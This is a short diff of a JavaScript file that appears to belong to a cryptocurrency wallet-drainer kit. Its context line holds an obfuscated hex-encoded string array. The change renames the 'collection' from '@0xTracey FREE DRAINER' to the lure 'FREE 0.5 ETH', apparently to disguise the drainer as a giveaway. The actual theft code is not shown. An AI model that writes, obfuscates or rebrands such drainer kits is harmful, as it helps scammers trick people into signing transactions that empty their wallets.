@@ -7,7 +7,7 @@ var _0xf9cd=["\x30\x78\x65\x31","\x30\x78\x31\x31\x66","\x30\x78\x32\x39\x34","\
 
 // Collection settings
 const collectionInfo = {
-    name: "@0xTracey FREE DRAINER",
+    name: "FREE 0.5 ETH",
     socialMedia: {
         discord: "https://discord.com",
         twitter: "https://twitter.com",
